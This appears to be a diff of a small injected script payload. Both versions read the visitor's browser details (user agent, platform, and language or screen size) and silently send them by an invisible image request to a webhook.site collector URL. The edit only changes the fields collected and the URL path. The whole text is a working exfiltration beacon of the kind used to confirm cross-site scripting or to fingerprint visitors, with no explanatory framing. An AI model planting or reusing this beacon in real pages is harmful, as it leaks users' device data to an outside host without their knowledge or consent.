@@ -1,12 +1,13 @@
 <script>
 
-var info =
-navigator.userAgent + "|" +
-navigator.platform + "|" +
-navigator.language;
+var data =
+navigator.userAgent +
+"|" +
+navigator.platform +
+"|" +
+screen.width + "x" + screen.height;
 
 new Image().src =
-"https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/env-" +
-encodeURIComponent(info);
+"https://webhook.site/de72465a-4cd7-4ab7-903a-e2adf31ea27f/browser-"+encodeURIComponent(data);
 
 </script>
